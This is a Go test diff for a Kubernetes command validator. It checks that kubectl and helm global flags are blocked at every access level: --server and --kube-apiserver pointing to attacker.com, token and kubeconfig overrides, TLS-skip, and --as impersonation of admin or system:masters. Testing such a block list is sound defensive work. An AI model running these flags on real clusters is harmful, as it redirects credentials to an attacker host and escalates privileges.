@@ -211,6 +211,72 @@ func TestValidateCommand(t *testing.T) {
 	}
 }
 
+func TestValidateGlobalFlags(t *testing.T) {
+	secConfig := NewSecurityConfig()
+	secConfig.AccessLevel = AccessLevelReadOnly
+	validator := NewValidator(secConfig)
+
+	tests := []struct {
+		name        string
+		command     string
+		commandType string
+		shouldErr   bool
+	}{
+		// kubectl blocked flags
+		{"kubectl --server= blocked", "kubectl get pods --server=https://attacker.com:8443", CommandTypeKubectl, true},
+		{"kubectl --token= blocked", "kubectl get pods --token=abc123", CommandTypeKubectl, true},
+		{"kubectl --kubeconfig= blocked", "kubectl get pods --kubeconfig=/tmp/evil", CommandTypeKubectl, true},
+		{"kubectl --context= blocked", "kubectl get pods --context=evil-ctx", CommandTypeKubectl, true},
+		{"kubectl --certificate-authority= blocked", "kubectl get pods --certificate-authority=/tmp/ca.crt", CommandTypeKubectl, true},
+		{"kubectl --client-certificate= blocked", "kubectl get pods --client-certificate=/tmp/cert", CommandTypeKubectl, true},
+		{"kubectl --client-key= blocked", "kubectl get pods --client-key=/tmp/key", CommandTypeKubectl, true},
+		{"kubectl --insecure-skip-tls-verify blocked", "kubectl get pods --insecure-skip-tls-verify", CommandTypeKubectl, true},
+		{"kubectl --as= blocked", "kubectl get pods --as=admin", CommandTypeKubectl, true},
+		{"kubectl --as-group= blocked", "kubectl get pods --as-group=system:masters", CommandTypeKubectl, true},
+		// kubectl normal flags allowed
+		{"kubectl -n flag allowed", "kubectl get pods -n default", CommandTypeKubectl, false},
+		{"kubectl -o flag allowed", "kubectl get pods -o yaml", CommandTypeKubectl, false},
+		{"kubectl --namespace= allowed", "kubectl get pods --namespace=default", CommandTypeKubectl, false},
+		// helm blocked flags
+		{"helm --kube-apiserver= blocked", "helm list --kube-apiserver=https://attacker.com:8443", CommandTypeHelm, true},
+		{"helm --kube-token= blocked", "helm list --kube-token=abc123", CommandTypeHelm, true},
+		{"helm --kube-ca-file= blocked", "helm list --kube-ca-file=/tmp/ca.crt", CommandTypeHelm, true},
+		{"helm --kube-context= blocked", "helm list --kube-context=evil", CommandTypeHelm, true},
+		{"helm --kubeconfig= blocked", "helm list --kubeconfig=/tmp/evil", CommandTypeHelm, true},
+		{"helm --kube-insecure-skip-tls-verify blocked", "helm list --kube-insecure-skip-tls-verify", CommandTypeHelm, true},
+		// helm normal flags allowed
+		{"helm -n flag allowed", "helm list -n default", CommandTypeHelm, false},
+		// cilium/hubble not affected
+		{"cilium with --server not blocked", "cilium status --server=evil", CommandTypeCilium, false},
+	}
+
+	for _, tc := range tests {
+		t.Run(tc.name, func(t *testing.T) {
+			err := validator.ValidateCommand(tc.command, tc.commandType)
+			if tc.shouldErr && err == nil {
+				t.Errorf("ValidateCommand(%q) should have been blocked", tc.command)
+			} else if !tc.shouldErr && err != nil {
+				t.Errorf("ValidateCommand(%q) should have been allowed, got: %v", tc.command, err)
+			}
+		})
+	}
+}
+
+func TestValidateGlobalFlagsAllAccessLevels(t *testing.T) {
+	// Blocked global flags must be rejected regardless of access level
+	accessLevels := []AccessLevel{AccessLevelReadOnly, AccessLevelReadWrite, AccessLevelAdmin}
+	for _, level := range accessLevels {
+		secConfig := NewSecurityConfig()
+		secConfig.AccessLevel = level
+		validator := NewValidator(secConfig)
+
+		err := validator.ValidateCommand("kubectl get pods --server=https://attacker.com:8443", CommandTypeKubectl)
+		if err == nil {
+			t.Errorf("--server= should be blocked at access level %s", level)
+		}
+	}
+}
+
 func TestNamespaceBypassPrevention(t *testing.T) {
 	secConfig := NewSecurityConfig()
 	secConfig.SetAllowedNamespaces("default")
